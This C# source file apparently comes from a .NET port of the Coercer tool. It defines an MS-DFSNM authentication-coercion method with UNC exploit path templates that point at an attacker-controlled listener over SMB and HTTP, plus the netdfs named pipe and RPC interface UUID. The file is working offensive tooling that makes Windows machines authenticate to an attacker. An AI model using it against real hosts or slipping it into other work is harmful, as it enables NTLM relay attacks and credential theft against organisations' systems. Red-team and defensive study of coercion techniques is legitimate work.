using Coercer_dotnet.structures;

namespace Coercer_dotnet.methods.MS_DFSNM
{
    public abstract class MS_DFSNM : Method
    {
        public override string Author => "@filip_dragovic";
        public override ExploitPath[] ExploitPaths => new ExploitPath[]
        {
            new(AuthType.SMB, "\\\\{{listener}}{{port}}\\{{8}}\\file.txt\x00"),
            new(AuthType.SMB, "\\\\{{listener}}{{port}}\\{{8}}\\\x00"),
            new(AuthType.SMB, "\\\\{{listener}}{{port}}\\{{8}}\x00"),
            new(AuthType.HTTP, "\\\\{{listener}}{{port}}/{{3}}\\share\\file.txt\x00")
        };
        public override NcanNpAccess[] NcanNpAccesses => new NcanNpAccess[] { new("\\PIPE\\netdfs", "4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0") };
        public override NcacnIpTcpAccess[] NcacnIpTcpAccesses => new NcacnIpTcpAccess[] { new("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0") };
        public override Protocol Protocol => new("[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol", "MS-DFSNM");
    }
}